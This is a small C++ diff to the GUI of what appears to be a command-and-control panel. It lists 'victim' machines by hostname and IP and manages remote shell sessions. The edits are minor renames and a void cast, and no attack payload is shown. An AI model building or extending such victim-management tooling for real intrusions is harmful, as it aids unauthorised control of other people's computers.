@@ -186,7 +186,7 @@ void drawConnectionsTab(WindowState& state) {
     GuiLabel({res.width/2 - 100, 50, 200, 30}, "List of Victim Connections");
 
     if (GuiButton({3, 58, 120, 20}, GuiIconText(ICON_REPEAT_FILL, "Refresh List"))) {
-        Client::instance().fetchVictims();
+        (void) Client::instance().fetchVictims(); //TODO: add log entry
     }
 
     Rectangle tableRect{0, 80, res.width, res.height - 90};
@@ -245,7 +245,7 @@ void drawConnectionsTab(WindowState& state) {
 
         const auto& vic{ victims[client_id] };
         const std::string values[colCount]{
-            std::to_string(vic.victim_id),
+            std::to_string(vic.id),
             vic.hostname,
             vic.internal_ip,
             vic.external_ip,
@@ -639,7 +639,7 @@ void drawSessionsTab(WindowState& state) {
     }
 
     Session& session = sessions.at(selected_session);
-    GuiPanel(viewRect, TextFormat("Session %d on port %d", session.session_id, session.port));
+    GuiPanel(viewRect, TextFormat("Session %d on port %d", session.id, session.port));
 
     //close session button
     if (GuiButton({viewRect.width - 130, viewRect.y + 2, 120, 20},  GuiIconText(ICON_CROSS, "Close Shell"))) {
